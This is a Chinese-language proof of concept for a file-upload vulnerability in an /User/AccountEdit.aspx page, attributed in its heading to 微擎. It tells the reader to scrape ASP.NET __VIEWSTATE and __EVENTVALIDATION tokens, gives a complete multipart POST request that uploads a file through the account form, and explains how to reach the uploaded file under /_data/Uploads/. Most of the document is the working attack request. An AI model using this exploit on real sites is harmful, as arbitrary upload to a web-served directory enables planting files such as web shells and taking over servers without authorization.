## 微擎-AccountEdit-file-upload文件上传漏洞


1、访问/User/AccountEdit.aspx，查看源代码，搜索__VIEWSTATE" value=" 和__EVENTVALIDATION" value="这两个字符串，记录下来
## poc
```
POST /User/AccountEdit.aspx HTTP/1.1
Host:
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data;boundary=---------------------------8448979704593935221298734076

-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="__VIEWSTATE"

{VIEWSTATE}
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="__EVENTVALIDATION"

{EVENTVALIDATION}
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$upload"; filename="111.txt"
Content-Type: text/plain

1233311
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$bttnUpload"

上传图片
-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtLastName"


-----------------------------8448979704593935221298734076
Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtEmail"


-----------------------------8448979704593935221298734076--
```

文件路径在第2步的响应里面搜索字符_data/Uploads/  即可找到，然后直接url+/_data/Uploads/{filepath}访问即可。
